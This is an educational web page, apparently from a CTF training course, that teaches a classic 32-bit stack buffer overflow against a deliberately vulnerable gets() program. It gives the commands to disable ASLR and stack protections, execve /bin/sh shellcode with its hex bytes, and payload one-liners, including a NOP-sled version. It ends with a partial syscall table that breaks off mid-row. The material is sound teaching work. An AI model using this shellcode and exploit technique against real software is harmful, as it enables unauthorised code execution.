<?php
$this->load->view('templates/header');
?>
<h1><?php if($level == "advanced"): ?>Advanced <?php else: ?> Basic <?php endif; ?> Exploitation</h1>

<?php if($level == "advanced"): ?>
<ul class="nav nav-pills">
  <li role="presentation" class="active"><a href="#walk">Exploit Walkthrough</a></li>
  <li role="presentation" class="active"><a href="#c">C Practice</a></li>
  <li role="presentation" class="active"><a href="#csoln">C Solutions</a></li>
  <li role="presentation" class="active"><a href="#syscalls">Linux System Calls</a></li>
  <li role="presentation" class="active"><a href="#othersyscalls">amd64 syscalls</a></li>
  <li role="presentation" class="active"><a href="#typedefs">Typedefs</a></li>
  <li role="presentation" class="active"><a href="#structs">Struct Declarations</a></li>
</ul>
<h2 id="walk">Walkthrough</h2>
<ul class="nav nav-pills">
  <li role="presentation" class="active"><a href="#setup">Setup</a></li>
  <li role="presentation" class="active"><a href="#vuln">Vulnerable Program</a></li>
  <li role="presentation" class="active"><a href="#diss">Disassemly & Reverse Engineering</a></li>
  <li role="presentation" class="active"><a href="#shell">Shellcode</a></li>
  <li role="presentation" class="active"><a href="#nop">NOP SLeds</a></li>
  <li role="presentation" class="active"><a href="#further">Further</a></li>
</ul>
  <h3 id="setup">Setup</h3>
    <p>You can get all of the files that this tutorial discusses
       <a href="exploit_walkthrough.tar.gz">here</a>
    </p>
    <p>In order to work on this exploit, we need to disable ASLR.  This
       is a security feature that we will learn about later.  To do this
       issue the following command in your shell:
    </p>
    <pre class="language-none">
    <code>$ exec setarch linux32 -R /bin/bash</code></pre>
    <p>This will disable ASLR for your current shell.  The rest of your OS,
       however, is still protected, so don't worry.
    </p>
    <h2 id="vuln">The vulnerable program (vulnerable.c)</h2>
    <pre class="language-c line-numbers">
    <code>#include &lt;stdio.h&gt;

    void vuln() {
        char buf[32];
        printf("What's your name? ");
        gets(buf);
        printf("Hi, %s!\n", buf);
    }

    int main() {
        vuln();
        return 0;
    }</code></pre>
    <p>Can you spot the vulnerability in this function?</p>
    <p>The vulnerability is the call to
       <code class="language-c">gets(buf)</code>.  This function will read a
       string from standard input and put it in buf.  The problem is that it
       does not check if buf is actually big enough to hold the result!  It just
       keeps on writing characters, no matter what actually resides in memory.
       We can use this to exploit the program.  Our attack will be a classic
       example of a buffer overflow exploit.
    </p>
    <p>First, let's compile this file.  Don't forget to add the extra options
       if you are on one of the Michelson computers!
    </p>
    <pre class="language-none">
    <code>$ gcc -m32 -z execstack -fno-stack-protector vulnerable.c -o vulnerable</code></pre>
    <p>The -z execstack -fno-stack-protector is there in order to disable
       a few extra security features on the final executable.
    </p>
    <p>Let's play around with the executable:</p>
    <pre class="language-none">
    <code>$ ./vulnerable
    What's your name? Blair
    Hi, Blair!
    $ ./vulnerable
    What's your name? Blair Mason
    Hi, Blair Mason!
    $ python -c "print 'A'*256" | ./vulnerable
    What's your name? Hi, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAA!
    Segmentation Fault
    $</code></pre>
    <p>Looks like we got the program to crash!  It makes sense that it crashed,
       though.  The gets function got 256 As and just blindly wrote them into
       memory, starting at the address of buf.  This is bound to run into
       something important and overwrite it.  Let's take a look at what happened
       by checking the kernel error logs:
    </p>
    <pre class="language-none"><code>$ dmesg | tail
    [442278.585208] vulnerable[30671]: segfault at 41414141 ip 0000000041414141
    sp 00000000ffffd860 error 14
    $</code></pre>
    <p>That error message (look for the one corresponding to your program)
       tells us that the segfault was triggered by trying to access memory address
       0x41414141.  What is 0x41 in ASCII? "A"! It also helps us by giving us the
       value of the instruction pointer (ip) and stack pointer (sp).  Look at
       the value of the instruction pointer: 0x41414141.  So the segfault was
       caused by the program trying to execute code starting at address
       0x41414141.
    </p>
    <p>Why did the program try to execute code from 0x41414141.  Recall the
       x86 calling convention.  The call instruction pushes the return address
       onto the stack and then jumps to the function.  The ret instruction pops
       that address off the stack and then jumps to that address.  However,
       what happens if the address is corrupted (overwritten) during the execution
       of the function?  The ret instruction still happily pops the address off
       the stack and jumps to it!  So now, we have a way to get the program to
       execute arbitrary code.
    </p>
  <h2 id="diss">Disassembly and Reverse Engineering</h2>
  <p>Now, our goal is to get a little bit more specific information about
     the program so we can craft our exploit payload.  Our goal will be to
     execute some arbitrary code.  This code, we hope, will spawn us a shell.
     So, we'll call it our shellcode.  Don't worry about the actual contents
     of this code for now - we'll cover that later.
  </p>
  <p>We can get a look at the actual assembly code by using the objdump
     command:
  </p>
  <pre class="language-none"><code>$ objdump -d -Mintel vulnerable &gt; vulnerable.asm</code></pre>
  <p>This gives us a dump of the assembly code.  The dump has three
     columns.  The first column is the address of the instruction.  The
     second column is the sequence of bytes that exists in memory at that
     location.  The third column is the assembly instructions that corrospond
     to that machine code.  Take a look at the vuln function (this isn't
     rocket science; just Ctrl+F or / for those of you awesome enough to
     be using vim):
<pre style='color:#d1d1d1;background:#333333;'><span style='color:#008c00; '>08048434</span> <span style='color:#d2cd86; '>&lt;</span>vuln<span style='color:#d2cd86; '>></span><span style='color:#d2cd86; '>:</span>
<span style='color:#e34adc; '>&#xa0;8048434:</span>       <span style='color:#008c00; '>55</span>                      <span style='color:#e66170; font-weight:bold; '>push</span>   <span style='color:#d0d09f; '>ebp</span>
<span style='color:#e34adc; '>&#xa0;8048435:</span>       <span style='color:#008c00; '>89</span> e5                   <span style='color:#e66170; font-weight:bold; '>mov</span>    <span style='color:#d0d09f; '>ebp</span><span style='color:#d2cd86; '>,</span><span style='color:#d0d09f; '>esp</span>
<span style='color:#e34adc; '>&#xa0;8048437:</span>       <span style='color:#008c00; '>83</span> ec <span style='color:#008c00; '>38</span>                <span style='color:#e66170; font-weight:bold; '>sub</span>    <span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>,</span><span style='color:#00a800; '>0x38</span>
<span style='color:#e34adc; '>&#xa0;804843a:</span>       b8 <span style='color:#008c00; '>50</span> <span style='color:#008c00; '>85</span> <span style='color:#008c00; '>04</span> <span style='color:#008c00; '>08</span>          <span style='color:#e66170; font-weight:bold; '>mov</span>    <span style='color:#d0d09f; '>eax</span><span style='color:#d2cd86; '>,</span><span style='color:#00a800; '>0x8048550</span>
<span style='color:#e34adc; '>&#xa0;804843f:</span>       <span style='color:#008c00; '>89</span> <span style='color:#008c00; '>04</span> <span style='color:#008c00; '>24</span>                <span style='color:#e66170; font-weight:bold; '>mov</span>    <span style='color:#e66170; font-weight:bold; '>DWORD</span> <span style='color:#e66170; font-weight:bold; '>PTR</span> <span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>]</span><span style='color:#d2cd86; '>,</span><span style='color:#d0d09f; '>eax</span>
<span style='color:#e34adc; '>&#xa0;8048442:</span>       e8 <span style='color:#008c00; '>19</span> ff ff ff          <span style='color:#e66170; font-weight:bold; '>call</span>   <span style='color:#e34adc; '>8048360</span> <span style='color:#d2cd86; '>&lt;</span>printf@plt<span style='color:#d2cd86; '>></span>
<span style='color:#e34adc; '>&#xa0;8048447:</span>       <span style='color:#008c00; '>8d</span> <span style='color:#008c00; '>45</span> d8                <span style='color:#e66170; font-weight:bold; '>lea</span>    <span style='color:#d0d09f; '>eax</span><span style='color:#d2cd86; '>,</span><span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>ebp</span><span style='color:#d2cd86; '>-</span><span style='color:#00a800; '>0x28</span><span style='color:#d2cd86; '>]</span>
<span style='color:#e34adc; '>&#xa0;804844a:</span>       <span style='color:#008c00; '>89</span> <span style='color:#008c00; '>04</span> <span style='color:#008c00; '>24</span>                <span style='color:#e66170; font-weight:bold; '>mov</span>    <span style='color:#e66170; font-weight:bold; '>DWORD</span> <span style='color:#e66170; font-weight:bold; '>PTR</span> <span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>]</span><span style='color:#d2cd86; '>,</span><span style='color:#d0d09f; '>eax</span>
<span style='color:#e34adc; '>&#xa0;804844d:</span>       e8 1e ff ff ff          <span style='color:#e66170; font-weight:bold; '>call</span>   <span style='color:#e34adc; '>8048370</span> <span style='color:#d2cd86; '>&lt;</span>gets@plt<span style='color:#d2cd86; '>></span>
<span style='color:#e34adc; '>&#xa0;8048452:</span>       b8 <span style='color:#008c00; '>63</span> <span style='color:#008c00; '>85</span> <span style='color:#008c00; '>04</span> <span style='color:#008c00; '>08</span>          <span style='color:#e66170; font-weight:bold; '>mov</span>    <span style='color:#d0d09f; '>eax</span><span style='color:#d2cd86; '>,</span><span style='color:#00a800; '>0x8048563</span>
<span style='color:#e34adc; '>&#xa0;8048457:</span>       <span style='color:#008c00; '>8d</span> <span style='color:#008c00; '>55</span> d8                <span style='color:#e66170; font-weight:bold; '>lea</span>    <span style='color:#d0d09f; '>edx</span><span style='color:#d2cd86; '>,</span><span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>ebp</span><span style='color:#d2cd86; '>-</span><span style='color:#00a800; '>0x28</span><span style='color:#d2cd86; '>]</span>
<span style='color:#e34adc; '>&#xa0;804845a:</span>       <span style='color:#008c00; '>89</span> <span style='color:#008c00; '>54</span> <span style='color:#008c00; '>24</span> <span style='color:#008c00; '>04</span>             <span style='color:#e66170; font-weight:bold; '>mov</span>    <span style='color:#e66170; font-weight:bold; '>DWORD</span> <span style='color:#e66170; font-weight:bold; '>PTR</span> <span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>+</span><span style='color:#00a800; '>0x4</span><span style='color:#d2cd86; '>]</span><span style='color:#d2cd86; '>,</span><span style='color:#d0d09f; '>edx</span>
<span style='color:#e34adc; '>&#xa0;804845e:</span>       <span style='color:#008c00; '>89</span> <span style='color:#008c00; '>04</span> <span style='color:#008c00; '>24</span>                <span style='color:#e66170; font-weight:bold; '>mov</span>    <span style='color:#e66170; font-weight:bold; '>DWORD</span> <span style='color:#e66170; font-weight:bold; '>PTR</span> <span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>]</span><span style='color:#d2cd86; '>,</span><span style='color:#d0d09f; '>eax</span>
<span style='color:#e34adc; '>&#xa0;8048461:</span>       e8 fa fe ff ff          <span style='color:#e66170; font-weight:bold; '>call</span>   <span style='color:#e34adc; '>8048360</span> <span style='color:#d2cd86; '>&lt;</span>printf@plt<span style='color:#d2cd86; '>></span>
<span style='color:#e34adc; '>&#xa0;8048466:</span>       c9                      <span style='color:#e66170; font-weight:bold; '>leave</span>
<span style='color:#e34adc; '>&#xa0;8048467:</span>       c3                      <span style='color:#e66170; font-weight:bold; '>ret</span></pre>
  <p>Before we begin analyzing this function, make sure you follow the
     number one rule of reverse engineering assembly code:  always draw out
     your stack!  Make sure you use pencil so you can keep updating memory,
     or in the best case have a whiteboard available.
  </p>
  <p>This function is pretty standard.  We first have our standard
     function prologue.  Then, we subtract 0x38 from esp, which allocates
     0x38 (56) bytes of space on the stack.
  </p>
  <p>We then move an address into eax, and place that at the top of the
     stack.  Then we call printf.  Note that we don't push the arguments like
     we would if we were handwriting assembly.  A lot of the time, compilers
     don't manually push/pop arguments but instead allocate a bit of extra
     space on the stack and just place arguments on the stack where they are
     supposed to go.  So, the first argument to the function is at the top
     of the stack (esp), the second argument right below that on the stack
     (and thus right above it in memory, esp+4), the third at esp+8, etc.
  </p>
  <p>So how do we find out what the first argument to printf is?  Well, we
     can figure it out by looking at the C code, but we do not always have
     that available.  In that case, objdump comes to our rescue once again:
  </p>
  <pre class="language-none">
  <code>$ objdump -s vulnerable &gt; vulnerable.dump</code></pre>
  <p>This file looks a lot like if you opened up a hex editor on RAM while
     running the program.  The headers tell you which section you are in.  For
     this case, the address we are looking for resides in the .rodata segment,
     which is just like the .data segment we used earlier except that the
     compiler has marked it as read only.
  </p>
  <pre class="language-none">
  <code>Contents of section .rodata:
   8048548 03000000 01000200 57686174 27732079  ........What's y
   8048558 6f757220 6e616d65 3f200048 692c2025  our name? .Hi, %
   8048568 73210a00    </code></pre>
  <p>When reading this dump, the first column is the memory
     address of the first byte displayed on that line.  After that is a
     sequence of hexadecimal digits that show the contents of that memory
     starting at that address, one dword (4 bytes) per grouping and 16 bytes
     per line.  After that is the ascii representation corrosponding to the
     contents you just saw in hex, with non-printable characters 
     represented by periods.  So, as you can see from the dump, the
     contents of memory at the address we passed to printf (0x8048550) is
     the string "What's your name? ".
  </p>
  <p>After calling printf, we load the address ebp-0x28 into eax, and place
     this address at the top of the stack.  We then call gets.  So, the
     buffer we want to overflow starts at address ebp-0x28.  We also know from
     the calling convention that the return address will reside at ebp+4.  So,
     there is a total of 0x28 + 4 = 0x2c = 44 bytes of space between the
     beginning of our buffer and the address we want to return to.  In this
     case, we'll place our shellcode immediately after the return address in
     memory, so our payload will be: 44 bytes of junk ("A"*44) + Shellcode
     Address + Shellcode.
  </p>
  <h2 id="shell">Shellcode</h2>
  <p>Shellcode is not incredibly complex assembly code.  The goal of
     shellcode is to spawn a shell.  The most common way to do this is
     by calling the execve /bin/bash system call.  You can find the calling
     convention for system calls <a href="x86_table.html">here</a>.
  </p>
  <pre style='color:#d1d1d1;background:#333333;'><span style='color:#008073; '>[BITS 32]</span>
   
  <span style='color:#9999a9; '>; Note that we MUST have a valid stack for this to work!</span>
   
  <span style='color:#e66170; font-weight:bold; '>xor</span> <span style='color:#d0d09f; '>ecx</span><span style='color:#d2cd86; '>,</span> <span style='color:#d0d09f; '>ecx</span>       <span style='color:#9999a9; '>; zero ecx</span>
  <span style='color:#e66170; font-weight:bold; '>mul</span> <span style='color:#d0d09f; '>ecx</span>            <span style='color:#9999a9; '>; edx:eax = eax*ecx, i.e. zeros edx and eax</span>
  <span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>al</span><span style='color:#d2cd86; '>,</span> <span style='color:#00a800; '>0xb</span>        <span style='color:#9999a9; '>; set eax to 0xb, syscall number for execve</span>
  <span style='color:#e66170; font-weight:bold; '>push</span> <span style='color:#d0d09f; '>ecx</span>           <span style='color:#9999a9; '>; pushes a zero onto the stack (stack is \0\0\0\0)</span>
  <span style='color:#e66170; font-weight:bold; '>push</span> <span style='color:#00c4c4; '>'//sh'</span>        <span style='color:#9999a9; '>; push '//sh' onto stack (stack is //sh\0\0\0\0)</span>
  <span style='color:#e66170; font-weight:bold; '>push</span> <span style='color:#00c4c4; '>'/bin'</span>        <span style='color:#9999a9; '>; push '/bin' onto stack (stack is /bin//sh\0\0\0\0)</span>
  <span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>ebx</span><span style='color:#d2cd86; '>,</span> <span style='color:#d0d09f; '>esp</span>       <span style='color:#9999a9; '>; set ebx (arg1: path) to stack pointer ("/bin//sh")</span>
  <span style='color:#e66170; font-weight:bold; '>push</span> <span style='color:#d0d09f; '>ecx</span>           <span style='color:#9999a9; '>; push another zero (execve needs a NULL at the end)</span>
  <span style='color:#e66170; font-weight:bold; '>push</span> <span style='color:#d0d09f; '>ebx</span>           <span style='color:#9999a9; '>; push addr of "/bin//sh"</span>
  <span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>ecx</span><span style='color:#d2cd86; '>,</span> <span style='color:#d0d09f; '>esp</span>       <span style='color:#9999a9; '>; set ecx (arg2: argv) to ["/bin//sh", 0]</span>
                     <span style='color:#9999a9; '>; edx (arg3: envp) is already NULL from `mul ecx`</span>
  <span style='color:#e66170; font-weight:bold; '>int</span> <span style='color:#00a800; '>80h</span>            <span style='color:#9999a9; '>; perform system call</span></pre>
  <p>You should be able to figure out how that works if you look at the
     calling convention, the man page for execve (2), look at those comments,
     and draw your stack out.  If you have issues, come talk to me.
  </p>
  <p>Now, we want to assemble this code out into a flat binary file:</p>
  <pre class="language-none">
  <code>$ nasm shellcode.asm -o shellcode</code></pre>
  <p>We can then use a small script to dump the shellcode as a string.
     Ths script (getascii):
  </p>
  <pre class="language-python line-numbers">
  <code>#!/usr/bin/env python
  import sys

  if len(sys.argv) != 2:
      sys.stderr.write('USAGE: ' + sys.argv[0] + ' FILE\n')
      sys.exit(1)

  with open(sys.argv[1], "rb") as f:
      byte = f.read(1)
      mystr = ''
      while byte != "":
          s = hex(ord(byte[0]))
          if len(s) == 3:
              mystr += '\\x0' + s[2:]
          else:
              mystr += '\\x' + s[2:]
          byte = f.read(1)
      print('"'+mystr+'"')</code></pre>
  <p>chmod that script so you can use it, and then we'll run the script.
     I'm also going to save it into an environment variable to make things
     clearer in this tutorial, but you can just copy and paste if you want.
     With more complex payloads, it is actually useful to copy your
     shellcode into a python script as the payload will be a bit much for a
     one liner.
  </p>
  <pre class="language-none">
  <code>$ ./getascii shell
  "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e
  \x89\xe3\x51\x53\x89\xe1\xcd\x80"
  $ SHELLCODE=`./getascii shell`</code></pre>
  <p>Now, we'll write our payload, with a dummy return to 0xdeadbeef to
     make sure that everything works.  Note that the return address is
     converted into <em>little endian</em>:
  </p>
  <pre class="language-none">
  <code>$ python -c "print 'A'*44+'\xef\xbe\xad\xde'+$SHELLCODE" | ./vulnerable
  What's your name? Hi, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAﾭQh//shh/binS!
  Segmentation fault
  $ dmesg | tail
  [616178.375511] vulnerable[16929]: segfault at deadbeef ip 00000000deadbeef
  sp 00000000ffffd860 error 14</code></pre>
  <p>Now, we see that the program segfaults accessing deadbeef, and that
     deadbeef is accessed because the program is trying to execute code at
     that location.  This is good.  So now, we want to change that deadbeef
     to the address of our shellcode.  Once we've popped the return address
     off the stack with the ret instruction, the stack pointer is going to
     point to whatever is directly above (in terms of the memory address,
     but beneath on the stack) in memory.  Because of where we put our
     shellcode, this happens to be the shellcode itself!  So, we can just
     fill in the stack pointer that dmesg gives us (NOTE: This will be different
     on your system!).  Let's dump our shellcode into a file:
  </p>
  <pre class="language-none">
  <code>$ python -c "print -c 'A'*44+'\x60\xd8\xff\xff'+$SHELLCODE" &gt; payload</code></pre>
  <p>Now, we execute our attack on this program.  We want to first send our
     payload to the program, and then we need to send standard input over
     to the program so that we can send commands to the shell.  So, the
     actual attack:
  </p>
  <pre class="language-none">
  <code>$ cat payload - | ./vulnerable
  What's your name? Hi, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAﾭQh//shh/binS!
  ls
  payload vulnerable vulnerable.asm vulnerable.c vulnerable.dump
  whoami
  m164122</code></pre>
  <p>Note that the shell will not give you any prompts; you just have to
     try typing commands and see if they work.
  </p>
  <p>Congratulations! You've completed the helloworld of binary
     exploitation!  Rejoice at the sight of your shell!  After many long
     hours of staring at hexadecimal during a CTF it is the most beautiful
     sight in the world...
  </p>
  <h2 id="nop">NOP Sleds</h2>
  <p>In some cases, you cannot precisely compute the address of your
     shellcode.  In other cases, you might be feeling lazy and not want
     to bother to precisely compute the address you want to jump to.  So,
     we use a technique called a NOP sled.  NOP is a machine instruction,
     opcode 0x90, which essentially tells the machine to continue on to
     the next instruction.  If we string a bunch of these together before
     our shellcode, then we can just guess an address.  All we need to
     hit now, is any address inside our NOP sled and the machine will
     gladly continue on to our shellcode.
  </p>
  <p>So, let's redesign our payload using a NOP sled.  We can be much
     lazier when designing a NOP sled payload, as nothing has to line up
     perfectly - just good enough.  Let's bring up the code for vuln
     again:
  </p>
  <pre class="language-c  line-numbers">
  <code>void vuln() {
      char buf[32];
      printf("What's your name? ");
      gets(buf);
      printf("Hi, %s!\n", buf);
  }</code></pre>
  <p>We see that our buffer is 32 bytes long, and there are no other
     variables allocated on the stack.  We know that the compiler is going
     to add in some other stuff/space on the stack, so let's just pick
     the next highest round number - 64 bytes (remember that round numbers
     are powers of 2 for us now!).  We'll fill this up with copies of the
     address we want to write.  The number of copies we'll need to write
     is 64 bytes / (4 bytes/copy) = 16 copies of the return address. Then,
     we'll add in a decent sized NOP Sled - let's say 256 NOPs.  Last, our
     shellcode.  Now, let's get a rough estimate for what address we should
     pick:
  </p>
  <pre class="language-none">
  <code>$ python -c "print 'A'*256" | ./vulnerable
  What's your name? Hi, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAA!
  Segmentation Fault
  $ dmesg | tail
  [442278.585208] vulnerable[30671]: segfault at 41414141 ip 0000000041414141
  sp 00000000ffffd850 error 14</code></pre>
  <p>We know our NOP sled is going to start somewhere around the vicinity
     of the stack pointer location at the crash.  Our NOP sled is 256 = 0x100
     bytes long, so we'll take half that (0x80) and add that to the stack
     pointer value at the crash to get 0xffffd8d0.  That should be about
     midway through our NOP sled and thus give us the best chance of hitting.
     So, the moment of truth:
  </p>
  <pre class="language-none">
  <code>$ python -c "print '\xd0\xd8\xff\xff'+'\x90'*256+$SHELLCODE" &gt; payload
  $ cat payload - | ./vulnerable
  What's your name? Hi, ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ1Qh//shh/binS!
  ls
  getascii  payload  shell  shell.asm  vulnerable  vulnerable.c</code></pre>
  <p>How much easier was that?  Draw out what memory should look like and
     convince yourself as to why it works.  You need to have a solid
     understanding of how the first exploit (that we precisely calculated)
     works in order to really get why we can be lazy using this NOP sled.
     If you want to get an exploit quickly, the NOP sled is an important tool
     to decrease the amount of work you have to do.  It also enables certain
     more advanced techniques that would be otherwise impossible.  Once you
     get how these exploits work (by doing the first one a few times) you will
     appreciate the simplicity of not having to be exact about memory.
  <h2 id="further">Further Work</h2>
  <p>This is a basic walkthrough on how to craft an exploit.  However,
     we turned off a lot of common mitigation techniques that are in use on
     modern machines.  We will go over some of these later, but the important
     information to gain from this is the basic walkthrough on the actual
     process of analysis, reverse engineering, payload crafting, and attack.
     In an actual competition later levels will take some of this information
     away from you.  They will place the program you need to exploit on a
     remote computer, so you no longer have nice diagnostics like dmesg to
     tell you how the program is failing.  They will not give you C source
     code.  They will turn on some (usually not all) of the mitigations that
     we turned off.  <strong>BUT</strong>, the basic techniques and the
     workflow for exploiting the program is the same - the only thing that
     changes is some of the details on how to craft the payload.
  </p>
  <br>
  <h1 id="c">C Exercises</h1>
  <p>Click on the exercise to display the challenge. When you are ready, view the solutions in the next section</p>
  <button type="button" class="btn btn-primary btn-lg" data-toggle="modal" data-target="#myModal">
  Exercise One
</button>
<button type="button" class="btn btn-primary btn-lg" data-toggle="modal" data-target="#myModal2">
  Exercise Two
</button>
<button type="button" class="btn btn-primary btn-lg" data-toggle="modal" data-target="#myModal3">
  Exercise Three
</button>

<h1 id="csoln">C Exercise Solutions</h1>
  <p>Use the buttons below to see solutions to the above challenges</p>

<h1 id="syscalls">Linux System Call Table</h1>
  <table id="example" class="table table-hover table-condensed table-inverted table-bordered table-striped">
   <thead>
      <tr>
         <th>%eax</th>
         <th>Name</th>
         <th>Source</th>
         <th>%ebx</th>
         <th>%ecx</th>
         <th>%edx</th>
         <th>%esi</th>
         <th>%edi</th>
      </tr>
   </thead>
   <tbody>
      <tr>
         <td>1</td>
         <td>sys_exit</td>
         <td><a href=
            "file:///usr/src/linux/kernel/exit.c">kernel/exit.c</a></td>
         <td>int</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>2</td>
         <td>sys_fork</td>
         <td><a href=
            "file:///usr/src/linux/arch/i386/kernel/process.c">arch/i386/kernel/process.c</a></td>
         <td><a href="#pt_regs">struct pt_regs</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>3</td>
         <td>sys_read</td>
         <td><a href=
            "file:///usr/src/linux/fs/read_write.c">fs/read_write.c</a></td>
         <td>unsigned int</td>
         <td>char *</td>
         <td><a href="#size_t">size_t</a></td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>4</td>
         <td>sys_write</td>
         <td><a href=
            "file:///usr/src/linux/fs/read_write.c">fs/read_write.c</a></td>
         <td>unsigned int</td>
         <td>const char *</td>
         <td><a href="#size_t">size_t</a></td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>5</td>
         <td>sys_open</td>
         <td><a href=
            "file:///usr/src/linux/fs/open.c">fs/open.c</a></td>
         <td>const char *</td>
         <td>int</td>
         <td>int</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>6</td>
         <td>sys_close</td>
         <td><a href=
            "file:///usr/src/linux/fs/open.c">fs/open.c</a></td>
         <td>unsigned int</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>7</td>
         <td>sys_waitpid</td>
         <td><a href=
            "file:///usr/src/linux/kernel/exit.c">kernel/exit.c</a></td>
         <td>pid_t</td>
         <td>unsigned int *</td>
         <td>int</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>8</td>
         <td>sys_creat</td>
         <td><a href=
            "file:///usr/src/linux/fs/open.c">fs/open.c</a></td>
         <td>const char *</td>
         <td>int</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>9</td>
         <td>sys_link</td>
         <td><a href=
            "file:///usr/src/linux/fs/namei.c">fs/namei.c</a></td>
         <td>const char *</td>
         <td>const char *</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>10</td>
         <td>sys_unlink</td>
         <td><a href=
            "file:///usr/src/linux/fs/namei.c">fs/namei.c</a></td>
         <td>const char *</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>11</td>
         <td>sys_execve</td>
         <td><a href=
            "file:///usr/src/linux/arch/i386/kernel/process.c">arch/i386/kernel/process.c</a></td>
         <td><a href="#pt_regs">struct pt_regs</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>12</td>
         <td>sys_chdir</td>
         <td><a href=
            "file:///usr/src/linux/fs/open.c">fs/open.c</a></td>
         <td>const char *</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>13</td>
         <td>sys_time</td>
         <td><a href=
            "file:///usr/src/linux/kernel/time.c">kernel/time.c</a></td>
         <td>int *</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>14</td>
         <td>sys_mknod</td>
         <td><a href=
            "file:///usr/src/linux/fs/namei.c">fs/namei.c</a></td>
         <td>const char *</td>
         <td>int</td>
         <td><a href="#dev_t">dev_t</a></td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>15</td>
         <td>sys_chmod</td>
         <td><a href=
            "file:///usr/src/linux/fs/open.c">fs/open.c</a></td>
         <td>const char *</td>
         <td><a href="#mode_t">mode_t</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>16</td>
         <td>sys_lchown</td>
         <td><a href=
            "file:///usr/src/linux/fs/open.c">fs/open.c</a></td>
         <td>const char *</td>
         <td><a href="#uid_t">uid_t</a></td>
         <td><a href="#gid_t">gid_t</a></td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>18</td>
         <td>sys_stat</td>
         <td><a href=
            "file:///usr/src/linux/fs/stat.c">fs/stat.c</a></td>
         <td>char *</td>
         <td><a href="#__old_kernel_stat">struct
            __old_kernel_stat *</a>
         </td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>19</td>
         <td>sys_lseek</td>
         <td><a href=
            "file:///usr/src/linux/fs/read_write.c">fs/read_write.c</a></td>
         <td>unsigned int</td>
         <td><a href="#off_t">off_t</a></td>
         <td>unsigned int</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>20</td>
         <td>sys_getpid</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sched.c">kernel/sched.c</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>21</td>
         <td>sys_mount</td>
         <td><a href=
            "file:///usr/src/linux/fs/super.c">fs/super.c</a></td>
         <td>char *</td>
         <td>char *</td>
         <td>char *</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>22</td>
         <td>sys_oldumount</td>
         <td><a href=
            "file:///usr/src/linux/fs/super.c">fs/super.c</a></td>
         <td>char *</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>23</td>
         <td>sys_setuid</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td><a href="#uid_t">uid_t</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>24</td>
         <td>sys_getuid</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sched.c">kernel/sched.c</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>25</td>
